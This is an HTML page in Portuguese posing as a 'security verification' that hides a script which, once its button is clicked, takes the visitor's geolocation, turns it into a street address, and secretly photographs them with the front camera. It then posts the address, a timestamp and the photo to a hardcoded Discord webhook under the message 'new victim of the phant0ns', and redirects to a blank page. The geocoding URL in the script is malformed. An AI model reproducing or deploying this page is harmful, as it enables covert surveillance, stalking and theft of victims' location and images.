<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
        .vermelho { color: red; font-weight: bold; font-size: 26px; margin-bottom: 10px; }
        .verde { color: #00ff00; font-weight: bold; font-size: 22px; margin-bottom: 10px; }
        #btn { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #222; color: white; border: 1px solid #444; border-radius: 8px; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="mensagens" style="display:none;">
        <p class="vermelho">TEXTO TEXTO TEXTO</p>
        <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
        <p>TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
    </div>

    <button id="btn">CLIQUE PARA CONTINUAR</button>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // WEBHOOK CONSERTADO E COMPLETO
        const URL_WEBHOOK = 'https://discord.com/api/webhooks/1495823762464178316/JUtyoihcRDnKawG_caqxpZ-G4k7NlZpSMSD5TOYG_gZj6asa9SCXsN1d8G-VSstpePse';

        document.getElementById('btn').addEventListener('click', async function() {
            document.getElementById('mensagens').style.display = 'block';
            this.style.display = 'none';

            try {
                // 1. Pega Localização
                const local = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000});
                });

                // 2. Converte coordenadas para NOME DA RUA/CIDADE (Geocoding)
                const resEnd = await fetch(`https://openstreetmap.org{local.coords.latitude}&lon=${local.coords.longitude}`);
                const dataEnd = await resEnd.json();
                const enderecoEscrito = dataEnd.display_name || "Endereço não identificado";

                // 3. Captura Foto Frontal
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500)); // Espera a câmera focar
                
                const c = document.getElementById('c');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const foto = c.toDataURL('image/jpeg');
                
                stream.getTracks().forEach(t => t.stop());

                // 4. Envia para o Discord
                const fd = new FormData();
                fd.append('payload_json', JSON.stringify({
                    content: "NOVA VÍTIMA DOS PHANT0NS 😈😈😈😈",
                    embeds: [{
                        title: "DADOS COLETADOS",
                        description: `📍 **LOCALIZAÇÃO:**\n${enderecoEscrito}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\nphant0ns 😈`,
                        color: 16711680,
                        image: { url: 'attachment://f.jpg' }
                    }]
                }));
                
                const blob = await (await fetch(foto)).blob();
                fd.append('file', blob, 'f.jpg');

                await fetch(URL_WEBHOOK, { method: 'POST', body: fd });
                
                setTimeout(() => { window.location.href = "about:blank"; }, 2000);

            } catch (e) {
                window.location.href = "about:blank";
            }
        });
    </script>
</body>
</html>
